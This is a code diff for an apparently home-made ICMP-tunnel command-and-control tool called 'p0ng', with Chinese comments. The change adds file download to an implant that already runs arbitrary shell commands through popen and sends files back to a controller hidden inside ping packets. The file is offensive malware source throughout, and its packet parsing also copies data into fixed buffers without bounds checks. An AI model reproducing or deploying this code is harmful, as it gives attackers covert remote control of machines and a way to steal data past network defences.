@@ -14,6 +14,7 @@
  * 3.支持可交互式的设置时间参数。包括，被控端请求周期与数据传输的周期。
  * 4.支持可交互式的设置p0ng协议数据大小。
  * 5.支持动态的开启一个数据转发代理端口。（暂不考虑）
+ * 6.任务报文中数据过长时自动扩展报文长度。
  *
  **/
 
@@ -49,7 +50,10 @@
 #define ICMP_UPLOAD             4
 #define ICMP_UPLOAD_RESULT      5
 #define ICMP_DOWNLOAD           6
-#define ICMP_DOWNLOAD_QUERY     7
+#define ICMP_DOWNLOAD_REQ       7
+#define ICMP_DOWNLOAD_ACK       8
+#define ICMP_DOWNLOAD_DATA_REQ  9
+#define ICMP_DOWNLOAD_DATA_RSP  10
 
 #define P0NG_CONNECTTION_TIMEOUT 11
 #define P0NG_HDR_ERROR           12
@@ -60,14 +64,14 @@
 #define USLEEP_TIME             400
 
 uint8_t current_work[ICMP_DATA_LEN-ICMP_DATA_PRESERVE];/*for any p0ng entity*/
-uint8_t msg2request[ICMP_DATA_LEN-ICMP_DATA_PRESERVE];/*for p0ng client*/
+uint8_t msg2send[ICMP_DATA_LEN-ICMP_DATA_PRESERVE];/*for p0ng client*/
 uint8_t msg_received[IPHDR_DEFAULT_LEN+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_LEN];/*for p0ng client*/
 uint8_t debug=1,verbose=1;
 struct sockaddr_in dest_addr;
 uint8_t sockfd;
 uint16_t pid; 
 struct timeval timeval_new={5,0};
-    
+
 unsigned short cal_chksum(unsigned short *addr, int len) {
     int nleft = len;
     int sum = 0;
@@ -114,7 +118,7 @@ void set_current_work(uint8_t work_type,uint8_t *data, uint8_t data_length) {
 }
 
 void reset_current_work(){
-	memset(current_work,0,sizeof(current_work));
+    memset(current_work,0,sizeof(current_work));
     (void)snprintf(current_work, ICMP_DATA_LEN-ICMP_DATA_PRESERVE, "%c%c%c%c%s",ICMP_NO_TASK, 0, 0, 0, "");
 }
 
@@ -152,6 +156,7 @@ uint8_t p0ng_pkt_basicchk(uint8_t *buff, uint8_t buff_len, uint8_t *sendpacket, 
 
     if(buff_len != (ICMP_DATA_LEN + ICMP_TIMESTAMP_LEN + ICMPHDR_LEN)){
         printf("recv-length: %d!\nIn Theroy: %d!\n",buff_len,(ICMP_DATA_LEN + ICMP_TIMESTAMP_LEN + ICMPHDR_LEN));
+        printf("info:%s --> %s ", inet_ntoa(st_ip->ip_src),inet_ntoa(st_ip->ip_dst));
     }
     if (st_icmp->icmp_type == ICMP_ECHOREPLY) {
         
@@ -169,7 +174,6 @@ uint8_t p0ng_pkt_basicchk(uint8_t *buff, uint8_t buff_len, uint8_t *sendpacket, 
     
     if (st_icmp->icmp_type == ICMP_ECHO) {
         if(verbose||debug) printf("\r\033[KRecved ICMP ECHO!\n");
-        // 理论上只有这几种类型的报文 ICMP_TASK_QUERY ICMP_SHELLCMD_RESULT ICMP_UPLOAD_RESULT ICMP_DOWNLOAD_QUERY
         return 0;
     }
     return 0;
@@ -210,9 +214,9 @@ void check_server(uint8_t seq_num){
     }
     memcpy(icmpdata,icmp_data_prefix,8);
 
-    (void)snprintf(msg2request, ICMP_DATA_LEN-ICMP_DATA_PRESERVE, "%c%c%c%c%s",ICMP_REGULAR, 0, 0, 0, "");//实际上就是正常的ping请求    
-    memcpy(icmpdata+8,msg2request,sizeof(msg2request));
-    icmp_data_len=ICMP_DATA_PRESERVE+sizeof(msg2request);
+    (void)snprintf(msg2send, ICMP_DATA_LEN-ICMP_DATA_PRESERVE, "%c%c%c%c%s",ICMP_REGULAR, 0, 0, 0, "");//实际上就是正常的ping请求    
+    memcpy(icmpdata+8,msg2send,sizeof(msg2send));
+    icmp_data_len=ICMP_DATA_PRESERVE+sizeof(msg2send);
     
     sendpacket_size = p0ng_pack(sendpacket,seq_num,ICMP_ECHO,icmpdata,icmp_data_len);//@todo 后期考虑怎么加密payload
     if(sendto(sockfd, sendpacket, sendpacket_size, 0, (struct sockaddr *) &dest_addr, sizeof(dest_addr)) < 0){
@@ -244,7 +248,6 @@ void show_execute_result(uint8_t *recvd_packet,uint8_t recvd_len){
     uint8_t iphdrlen;
     struct ip *ip;
     struct timeval timeval_old;
-    struct timeval timeval_new={30,0};
     int32_t length=0;
     
     memcpy(recvpacket,recvd_packet,recvd_len);    
@@ -256,6 +259,7 @@ void show_execute_result(uint8_t *recvd_packet,uint8_t recvd_len){
     if(not_finish){
         printf("\r\033[K%s",recvpacket+iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_PRESERVE+4);
     }
+    
     while(not_finish){
         getsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO , &timeval_old, &length);
         setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO , &timeval_new, sizeof(struct timeval));
@@ -276,9 +280,8 @@ void show_upload_result(uint8_t *recvd_packet,uint8_t recvd_len){
     uint8_t iphdrlen;
     struct ip *ip;
     struct timeval timeval_old;
-    struct timeval timeval_new={30,0};
     int32_t length=0;
-    uint8_t filename[50];
+    uint8_t filename[36];
     
     time_t t;
     time(&t);
@@ -290,9 +293,9 @@ void show_upload_result(uint8_t *recvd_packet,uint8_t recvd_len){
     {
         printf("\033[40;31m[-]\033[0mfopen error!\n");
         return ;
-    }  
-	
-    memcpy(recvpacket,recvd_packet,recvd_len);    
+    }
+    
+    memcpy(recvpacket,recvd_packet,recvd_len);
     ip = (struct ip *) recvpacket;
     iphdrlen = ip->ip_hl << 2;
 
@@ -304,10 +307,10 @@ void show_upload_result(uint8_t *recvd_packet,uint8_t recvd_len){
         setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO , &timeval_new, sizeof(struct timeval));
         pkt_size = recv(sockfd, recvpacket, sizeof(recvpacket), 0);//@todo 后期考虑能动态设置，当前设置30s超时
         setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO , &timeval_old, sizeof(struct timeval));
-		
+        
         not_finish = recvpacket[iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_PRESERVE+1];
         fwrite(recvpacket+iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_PRESERVE+4, recvpacket[iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_PRESERVE+3],1, fp);
-		if (!not_finish) break;
+        if (!not_finish) break;
     }
 
     printf("\033[40;36m[*]\033[0mUpload completed. Local filename: \033[40;36m%s\033[0m\n", filename);
@@ -315,9 +318,105 @@ void show_upload_result(uint8_t *recvd_packet,uint8_t recvd_len){
 }
 
 //@todo client支持download功能
-void show_download_result(uint8_t *recvd_packet,uint8_t recvd_len){
-	printf("stub show_download_result\n");
+//首包用于通知包，后续包在响应中附带数据，状态位指示下一个请求包的类型。终包指示远端保存时使用的文件名。
+void show_download_result(uint8_t *recvd_packet, uint8_t recvd_len){
 
+    uint8_t recvpacket[IPHDR_DEFAULT_LEN+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_LEN];
+    struct ip *ip;
+    uint8_t iphdrlen;
+    uint8_t filename[36]={0};
+    uint8_t seq_num=0;
+    uint8_t pkt_size=0;
+    uint8_t ret=0;
+    uint8_t i=0    ;
+    uint8_t icmpdata[48]={0};
+    uint8_t data[ICMP_DATA_LEN-ICMP_DATA_PRESERVE-4]={0};
+    uint8_t icmp_data_len=0;
+    uint8_t sendpacket_size;
+    uint8_t data2send[100];//不用公共的，为未来一控多提供方便。
+    uint8_t done_yet;
+    struct timeval timeval_old;
+    int32_t length=0;
+    
+    // analysis recvd ICMP_DOWNLOAD_ACK, got filename
+    memcpy(recvpacket, recvd_packet, recvd_len);
+    ip = (struct ip *) recvpacket;
+    iphdrlen = ip->ip_hl << 2;
+    memcpy(filename, recvpacket+iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_PRESERVE+4, 
+            recvpacket[iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_PRESERVE+3]);
+    printf("\r\033[40;36m[*]\033[0m(%s) > query: \033[40;36m%s\033[0m\n", inet_ntoa(ip->ip_src),filename);
+    
+    FILE *fp = fopen(filename, "r");
+    if(fp == NULL)
+    {
+        printf("\033[40;31m[-]\033[0mfopen error!\n");
+        return ;
+    }
+    
+    //send ICMP_DOWNLOAD_ACK
+    memset(data2send,0,ICMP_DATA_LEN-ICMP_DATA_PRESERVE);
+    (void)snprintf(data, ICMP_DATA_LEN-ICMP_DATA_PRESERVE, "%c%c%c%c%s",ICMP_DOWNLOAD_ACK, 0, seq_num, 0, "");  
+    memcpy(icmpdata+8,data,sizeof(data));
+    icmp_data_len = sizeof(icmpdata);
+    sendpacket_size = p0ng_pack(data2send,seq_num,ICMP_ECHOREPLY,icmpdata,icmp_data_len);    //uint8_t *sendpacket, uint8_t pack_no, 
+    if(sendto(sockfd, data2send, sendpacket_size, 0, (struct sockaddr *) &dest_addr, sizeof(dest_addr)) < 0){
+        printf("send error!\n");
+        return ;
+    }
+    
+    
+    while(!feof(fp) ){
+        //clean
+        memset(data,0,sizeof(data));
+        memset(icmpdata,0,sizeof(icmpdata));
+        memset(data2send,0,sizeof(data2send));
+        usleep(USLEEP_TIME);
+        
+        //recv
+        getsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO , &timeval_old, &length);
+         setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO , &timeval_new, sizeof(struct timeval));
+         pkt_size = recv(sockfd, recvpacket, sizeof(recvpacket), 0);//@todo 后期考虑能动态设置，当前先设置10s超时
+         setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO , &timeval_old, sizeof(struct timeval));
+
+        //read
+        ret=fread(data, 1, sizeof(data)-1, fp);
+        //send
+        (void)snprintf(icmpdata+8, 5, "%c%c%c%c", ICMP_DOWNLOAD_DATA_RSP, 0, ++seq_num, ret);
+        memcpy(icmpdata+8+4, data, ret);
+        sendpacket_size = p0ng_pack(data2send, seq_num, ICMP_ECHOREPLY, icmpdata, ICMP_DATA_PRESERVE+4+ret);
+
+        if( sendto(sockfd, data2send, sendpacket_size, 0, (struct sockaddr *) &dest_addr, sizeof(dest_addr)) < 0){
+            printf("\033[40;31m[-]\033[0msendto error!\n");
+        }
+        
+    }
+    fclose(fp);
+    //通知数据结束(先收再发)，后面并到上面的循环里
+    getsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO , &timeval_old, &length);
+     setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO , &timeval_new, sizeof(struct timeval));
+     pkt_size = recv(sockfd, recvpacket, sizeof(recvpacket), 0);//@todo 后期考虑能动态设置，当前先设置10s超时
+     setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO , &timeval_old, sizeof(struct timeval));
+    memset(icmpdata,0,sizeof(icmpdata));
+    memset(data2send,0,sizeof(data2send));
+    (void)snprintf(icmpdata+8, 5, "%c%c%c%c", ICMP_DOWNLOAD_DATA_RSP, 1, ++seq_num, 0);
+    sendpacket_size = p0ng_pack(data2send, seq_num, ICMP_ECHOREPLY, icmpdata, ICMP_DATA_PRESERVE+4+ret);
+    sendto(sockfd, data2send, sendpacket_size, 0, (struct sockaddr *) &dest_addr, sizeof(dest_addr));
+    
+    //    send 
+    //收客户端发来的新文件名
+    getsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO , &timeval_old, &length);
+     setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO , &timeval_new, sizeof(struct timeval));
+     pkt_size = recv(sockfd, recvpacket, sizeof(recvpacket), 0);//@todo 后期考虑能动态设置，当前先设置10s超时
+     setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO , &timeval_old, sizeof(struct timeval));
+    if(strlen(recvpacket+iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_PRESERVE+4)<ICMP_DATA_LEN-ICMP_DATA_PRESERVE-4){
+        memcpy(filename,recvpacket+iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_PRESERVE+4,
+            strlen(recvpacket+iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_PRESERVE+4));
+    }else{
+        memcpy(filename, "*Unknow*", strlen("*Unknow*"));
+    }
+    
+    printf("\033[40;36m[*]\033[0mDownload completed. Remote filename: \033[40;36m%s\033[0m\n", filename);
+    
 }
 
 void regular_responcer(uint8_t *recvpkt, uint8_t recvpkt_len){
@@ -402,13 +501,13 @@ uint8_t currentwork_requester(uint8_t seq_num){
     }
     memcpy(icmpdata,icmp_data_prefix,8);
 
-    memset(msg2request,0,ICMP_DATA_LEN-ICMP_DATA_PRESERVE);
-    (void)snprintf(msg2request, ICMP_DATA_LEN-ICMP_DATA_PRESERVE, "%c%c%c%c%s",ICMP_TASK_QUERY, 0, 0, 0, "");  
-    memcpy(icmpdata+8,msg2request,sizeof(msg2request));
-    icmp_data_len = ICMP_DATA_PRESERVE+sizeof(msg2request);
+    memset(msg2send,0,ICMP_DATA_LEN-ICMP_DATA_PRESERVE);
+    (void)snprintf(msg2send, ICMP_DATA_LEN-ICMP_DATA_PRESERVE, "%c%c%c%c%s",ICMP_TASK_QUERY, 0, 0, 0, "");  
+    memcpy(icmpdata+8,msg2send,sizeof(msg2send));
+    icmp_data_len = ICMP_DATA_PRESERVE+sizeof(msg2send);
     
-    sendpacket_size = p0ng_pack(msg2request,seq_num,ICMP_ECHO,icmpdata,icmp_data_len);//@todo 后期考虑怎么加密payload
-    if(sendto(sockfd, msg2request, sendpacket_size, 0, (struct sockaddr *) &dest_addr, sizeof(dest_addr)) < 0){
+    sendpacket_size = p0ng_pack(msg2send,seq_num,ICMP_ECHO,icmpdata,icmp_data_len);//@todo 后期考虑怎么加密payload
+    if(sendto(sockfd, msg2send, sendpacket_size, 0, (struct sockaddr *) &dest_addr, sizeof(dest_addr)) < 0){
         return 1;
     }
 
@@ -420,7 +519,7 @@ uint8_t currentwork_requester(uint8_t seq_num){
         if (verbose||debug) printf("Connect timeout!\n");
         return P0NG_CONNECTTION_TIMEOUT;
     }
-    if(p0ng_pkt_basicchk(recvpacket, recv_pkt_size, msg2request, sendpacket_size)){/*正常为0*/
+    if(p0ng_pkt_basicchk(recvpacket, recv_pkt_size, msg2send, sendpacket_size)){/*正常为0*/
         printf("[-]Something wrong in responce.\n");
         return P0NG_HDR_ERROR;
     }
@@ -459,7 +558,7 @@ void do_execute_task(){
     pack_size = ICMP_DATA_LEN + ICMP_TIMESTAMP_LEN + ICMPHDR_LEN;
     if(verbose||debug) printf("cmd:%s\n",msg_received+iphdrlen+28);
     
-	//命令执行
+    //命令执行
     fp = popen(msg_received+iphdrlen+28,"r");//28=24+4个校验位
     if(fp==NULL){
         printf("\033[40;31m[-]\033[0m popen error!\n");
@@ -498,7 +597,7 @@ void do_execute_task(){
 void do_upload_task(){
     uint8_t pkt2send[ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_LEN]={0}; //该payload不含IPHDR
     uint8_t data2send[ICMP_DATA_LEN-ICMP_DATA_PRESERVE-4]={0};//4 为data域内的几个状态位
-	uint8_t filename[50]={0};
+    uint8_t filename[36]={0};
     uint8_t iphdrlen;
     uint8_t pack_size;
     struct ip *recv_ip, *send_ip;
@@ -506,7 +605,7 @@ void do_upload_task(){
     struct timeval *tval;
     uint8_t ret=0;
     uint8_t seq_id=0,not_ok=1;
-	
+    
     //使用msg_received解析出IP头
     recv_ip = (struct ip *) msg_received;
     iphdrlen = (recv_ip->ip_hl)*4; /*ip报头的长度标志乘4求得ip报头长度*/
@@ -521,36 +620,36 @@ void do_upload_task(){
     pack_size = ICMP_DATA_LEN + ICMP_TIMESTAMP_LEN + ICMPHDR_LEN;
     
     strncpy(filename, msg_received+iphdrlen+28, sizeof(msg_received));
-	filename[strlen(filename)-1]='\0';
-	if(verbose||debug) printf("file 2 upload:%s\n",filename);
+    filename[strlen(filename)-1]='\0';
+    if(verbose||debug) printf("file 2 upload:%s\n",filename);
     FILE *fp = fopen(filename, "r");//28=24+4个校验位
     if(fp==NULL){
         printf("\033[40;31m[-]\033[0m fopen error!\n");
-		return ;
+        return ;
     }
 
     while(!feof(fp)){
-		memset(pkt2send+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_PRESERVE,0,ICMP_DATA_LEN-ICMP_DATA_PRESERVE);
-		memset(data2send,0,sizeof(data2send)-1);
+        memset(pkt2send+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_PRESERVE,0,ICMP_DATA_LEN-ICMP_DATA_PRESERVE);
+        memset(data2send,0,sizeof(data2send)-1);
         usleep(USLEEP_TIME);
         seq_id++;        
         ret=fread(data2send, 1, sizeof(data2send)-1, fp);
-		
+        
         //下面开始拼接ICMP-p0ng的DATA域
-        //拷贝 ICMP时间戳 数据区的8位保留数据
+        //拷贝 ICMP时间戳 数据区的8位保留数据,(这里有点问题，应该是自己随机生成的，没必要用上一对包的随机值)
         memcpy(pkt2send+ICMPHDR_LEN, msg_received+iphdrlen+ICMPHDR_LEN, ICMP_TIMESTAMP_LEN);
         memcpy(pkt2send+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN, msg_received+iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN, ICMP_DATA_PRESERVE);
         memcpy(send_icmp->icmp_data,recv_icmp->icmp_data,ICMP_DATA_PRESERVE);
         //拷贝 文件数据到p0ng的核心数据区，前面4字节是状态控制字。
         (void)snprintf(pkt2send + ICMPHDR_LEN + ICMP_TIMESTAMP_LEN +  ICMP_DATA_PRESERVE,
                ICMP_DATA_LEN-8, "%c%c%c%c", ICMP_UPLOAD_RESULT, not_ok, seq_id, ret );
-	    memcpy(pkt2send+ ICMP_TIMESTAMP_LEN + ICMPHDR_LEN + ICMP_DATA_PRESERVE+4, data2send, sizeof(data2send)-1);
+        memcpy(pkt2send+ ICMP_TIMESTAMP_LEN + ICMPHDR_LEN + ICMP_DATA_PRESERVE+4, data2send, sizeof(data2send)-1);
         //ICMP头校验
         send_icmp->icmp_cksum = cal_chksum((uint16_t *) send_icmp, pack_size);
         //发送回包
         sendto(sockfd, pkt2send, ICMP_DATA_LEN + ICMP_TIMESTAMP_LEN + ICMPHDR_LEN, 
                0, (struct sockaddr *) &dest_addr, sizeof(dest_addr));
-		
+        
     }
    //构造尾包用来通知服务器端数据传输结束。
     not_ok=0;
@@ -566,7 +665,119 @@ void do_upload_task(){
 }
 
 void do_download_task(){
-    printf("stub for do_download_task!\n");
+    uint8_t pkt2send[ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_LEN]={0}; //该payload不含IPHDR
+    uint8_t data2send[ICMP_DATA_LEN-ICMP_DATA_PRESERVE-4]={0};//4 为data域内的几个状态位
+    uint8_t datareceived[IPHDR_DEFAULT_LEN+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_LEN];
+    uint8_t filename[36]={0};
+    uint8_t new_filename[36]={0};
+    uint8_t iphdrlen;
+    uint8_t pack_size;
+    struct ip *recv_ip, *send_ip;
+    struct icmp *recv_icmp, *send_icmp;
+    struct timeval *tval;
+    uint8_t ret=0;
+    uint8_t seq_id=0,not_ok=1,done_yet=0;
+    time_t t;
+    uint8_t pkt_size;
+    uint8_t i =0;
+    time(&t);
+    struct timeval timeval_old;
+    int32_t length=0;
+    struct tm *tmp_time=localtime(&t);
+    
+    //使用msg_received解析出IP头
+    recv_ip = (struct ip *) msg_received;
+    iphdrlen = (recv_ip->ip_hl)*4; /*ip报头的长度标志乘4求得ip报头长度*/
+    recv_icmp = (struct icmp *) (msg_received + iphdrlen); 
+    //需要发送的ICMP-p0ng包，包头在这里预拼接
+    send_icmp = (struct icmp*)pkt2send;
+    send_icmp->icmp_type = ICMP_ECHO;
+    send_icmp->icmp_code = recv_icmp->icmp_code;
+    send_icmp->icmp_cksum = 0;
+    send_icmp->icmp_seq = recv_icmp->icmp_seq;
+    send_icmp->icmp_id = recv_icmp->icmp_id;
+    pack_size = ICMP_DATA_LEN + ICMP_TIMESTAMP_LEN + ICMPHDR_LEN;
+
+    //remote file
+    strncpy(filename, msg_received+iphdrlen+28, sizeof(msg_received));
+    filename[strlen(filename)-1]='\0';
+    //local file
+    strftime(new_filename,sizeof(new_filename),"%04Y%02m%02d%H%M%S.p0ng",tmp_time);
+    if(verbose||debug) printf("[!]download. rmtfile:%s  &  localfile:%s \n", filename, new_filename);
+    
+    memset(pkt2send+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_PRESERVE, 0, ICMP_DATA_LEN-ICMP_DATA_PRESERVE);
+    memset(data2send, 0, sizeof(data2send)-1);
+    memset(msg_received,0,sizeof(msg_received));
+    usleep(USLEEP_TIME);
+    seq_id++;
+    (void)snprintf(pkt2send + ICMPHDR_LEN + ICMP_TIMESTAMP_LEN +  ICMP_DATA_PRESERVE,
+           ICMP_DATA_LEN-8, "%c%c%c%c%s", ICMP_DOWNLOAD_REQ, not_ok, seq_id, (uint8_t)strlen(filename), filename);
+    send_icmp->icmp_cksum = cal_chksum((uint16_t *) send_icmp, pack_size);
+    sendto(sockfd, pkt2send, ICMP_DATA_LEN + ICMP_TIMESTAMP_LEN + ICMPHDR_LEN, 
+               0, (struct sockaddr *) &dest_addr, sizeof(dest_addr));
+    getsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO , &timeval_old, &length);
+    setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO , &timeval_new, sizeof(struct timeval));
+    pkt_size = recv(sockfd, msg_received, sizeof(msg_received), 0); //@todo 后期考虑能动态设置，当前先设置10s超时
+    setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO , &timeval_old, sizeof(struct timeval));
+    if(msg_received[iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_PRESERVE]!=ICMP_DOWNLOAD_ACK){
+        printf("[Error] Type: want %d but got %d!\n",ICMP_DOWNLOAD_ACK, msg_received[iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_PRESERVE]);
+        return;
+    }
+    FILE *fp = fopen(new_filename, "wb");//28=24+4个校验位
+    
+    if(fp==NULL){
+        printf("\033[40;31m[-]\033[0m fopen error!\n");
+        return ;
+    }
+    
+
+
+    while(1){
+        
+        memset(pkt2send+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_PRESERVE, 0, ICMP_DATA_LEN-ICMP_DATA_PRESERVE);
+        memset(data2send, 0, sizeof(data2send)-1);
+        memset(msg_received,0,sizeof(msg_received));
+        usleep(USLEEP_TIME);
+        seq_id++;
+
+        (void)snprintf(pkt2send + ICMPHDR_LEN + ICMP_TIMESTAMP_LEN +  ICMP_DATA_PRESERVE,
+               5, "%c%c%c%c", ICMP_DOWNLOAD_DATA_REQ, not_ok, seq_id, 0 );
+        send_icmp->icmp_cksum = cal_chksum((uint16_t *) send_icmp, pack_size);
+        sendto(sockfd, pkt2send, ICMP_DATA_LEN + ICMP_TIMESTAMP_LEN + ICMPHDR_LEN, 
+               0, (struct sockaddr *) &dest_addr, sizeof(dest_addr));
+        
+        
+        //收服务器的响应（响应为文件数据。）
+        getsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO , &timeval_old, &length);
+        setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO , &timeval_new, sizeof(struct timeval));
+        pkt_size = recv(sockfd, msg_received, sizeof(msg_received), 0); //@todo 后期考虑能动态设置，当前先设置10s超时
+        setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO , &timeval_old, sizeof(struct timeval));
+        done_yet=msg_received[iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_PRESERVE+1];
+        if(done_yet){
+            break ;
+        }
+        if(msg_received[iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_PRESERVE]!=ICMP_DOWNLOAD_DATA_RSP){
+            printf("[Error] Type: want %d but got %d!\n",ICMP_DOWNLOAD_DATA_RSP, msg_received[iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_PRESERVE]);
+            return ;
+        }
+
+        //check if msg type is ICMP_DOWNLOAD_DATA_RSP
+        fwrite(msg_received+iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_PRESERVE+4, msg_received[iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+8+3], 1, fp);
+
+    }
+    
+   //构造尾包告知服务器本地文件名。
+    not_ok=0;
+    memset(pkt2send+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_PRESERVE,0,ICMP_DATA_LEN-ICMP_DATA_PRESERVE);
+    memcpy(pkt2send+ICMPHDR_LEN, msg_received+iphdrlen+ICMPHDR_LEN, ICMP_TIMESTAMP_LEN);
+    memcpy(pkt2send+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN, msg_received+iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN, ICMP_DATA_PRESERVE);
+
+    (void)snprintf(pkt2send+ICMP_TIMESTAMP_LEN+ICMPHDR_LEN+ICMP_DATA_PRESERVE, ICMP_DATA_LEN-8,
+                    "%c%c%c%c%s", ICMP_DOWNLOAD_DATA_REQ, not_ok, ++seq_id, (uint8_t)strlen(new_filename), new_filename);
+    send_icmp->icmp_cksum = cal_chksum((uint16_t *) send_icmp, pack_size);
+    sendto(sockfd, pkt2send, ICMP_DATA_LEN + ICMP_TIMESTAMP_LEN + ICMPHDR_LEN, 
+           0, (struct sockaddr *) &dest_addr, sizeof(dest_addr));
+    fclose(fp);
 }
 
 void client_dispatch_work(){
@@ -579,8 +790,7 @@ void client_dispatch_work(){
             do_upload_task();
             break;
         case ICMP_DOWNLOAD:
-            /*download比较特殊，先给服务器回报通知可以发数据了，再接受服务器数据，最周返给服务器文件名称*/
-			do_download_task();
+            do_download_task();
             break;
         case ICMP_REGULAR:
             break;
@@ -588,7 +798,6 @@ void client_dispatch_work(){
             break;
         case ICMP_SHELLCMD_RESULT:            
         case ICMP_UPLOAD_RESULT:
-        case ICMP_DOWNLOAD_QUERY:
         default:
             if(verbose||debug) printf("[-]recv malformed packet! p0ngtype (%x)\n",current_work[0]);
     }
@@ -683,10 +892,12 @@ void *p0ng_server(){
     pid = getpid();
     
     while(1){
+        memset(recvpacket,0,sizeof(recvpacket));
         pkt_size = recv(sockfd, recvpacket, sizeof(recvpacket), 0);
         st_ip = (struct ip *) recvpacket;
         strcpy(ip_src,inet_ntoa(st_ip->ip_src));
         strcpy(ip_dst,inet_ntoa(st_ip->ip_dst));
+        if(!strcmp(ip_src, ip_dst)) continue;
         if(verbose||debug) printf("\r\033[K\033[40;34m[@]\033[0m %s --> %s %dbytes\n", ip_src, ip_dst, pkt_size);
         iphdr_len = st_ip->ip_hl << 2;
         icmptotal_len = pkt_size - iphdr_len;
@@ -699,33 +910,29 @@ void *p0ng_server(){
         switch(pkt_type)
         {
             case ICMP_TASK_QUERY://处理客户端发来的任务请求，返回当前任务信息
-                if(verbose||debug) printf("\r\033[KEntering @current_task_responcer@\n");
                 current_task_responcer(recvpacket, pkt_size);//basic icmp-pktcheck
                 break;
             case ICMP_SHELLCMD_RESULT://处理客户端发来的shell命令执行结果。
-                if(verbose||debug) printf("\r\033[KEntering @show_execute_result@\n");
                 show_execute_result(recvpacket, pkt_size); 
                 break;
             case ICMP_UPLOAD_RESULT://处理客户端发来的文件上传数据。
-                if(verbose||debug) printf("\r\033[KEntering @upload_responcer@\n");
                 show_upload_result(recvpacket, pkt_size); 
                 break;
-            case ICMP_DOWNLOAD_QUERY://处理客户端发来的文件下载请求，并返回文件数据。
-                if(verbose||debug) printf("\r\033[KEntering @download_responcer@\n");
+            case ICMP_DOWNLOAD_REQ://处理客户端发来的文件下载请求，并返回文件数据。
                 show_download_result(recvpacket, pkt_size); 
                 break;
             //@todo delete such case later
             case ICMP_SHELLCMD:
             case ICMP_UPLOAD:
-            case ICMP_DOWNLOAD:
+            case ICMP_DOWNLOAD_ACK:
+            case ICMP_DOWNLOAD_DATA_RSP:
                 printf("\r\033[K\033[40;31m[-]\033[0mOooops.Received wrong type packet\n");
             default://处理正常的ICMP报文及其他情况。按照正常的ICMP响应来构造。
-                if(verbose||debug) printf("\r\033[KEntering @regular_responcer@\n");
                 regular_responcer(recvpacket, pkt_size);
                 
         }
         reset_current_work();
-		//@todo 支持更新被控端的状态，会话是否已经老化死亡。
+        //@todo 支持更新被控端的状态，会话是否已经老化死亡。
 
     } 
 }
@@ -753,6 +960,14 @@ void p0ng_c2_main(){
             set_current_work(ICMP_UPLOAD, p0ngcmd+7, strlen(p0ngcmd+7));
         } else if (strncmp(p0ngcmd,"download ",9) == 0){
             set_current_work(ICMP_DOWNLOAD, p0ngcmd+9, strlen(p0ngcmd+9));
+        } else if ((strcmp(p0ngcmd,"set querytime\n") == 0)){
+            printf("stub 4 query period !");
+            //timeval_new.tv_sec=;
+            //timeval_new.tv_usec=;
+        } else if ((strcmp(p0ngcmd,"set timeout\n") == 0)){
+            printf("stub 4 timeout setting!");
+            //timeval_new.tv_sec=;
+            //timeval_new.tv_usec=;
         } else if ((strcmp(p0ngcmd,"help\n") == 0)){
             print_usage();
         } else if (strcmp(p0ngcmd,"\n") ==0){
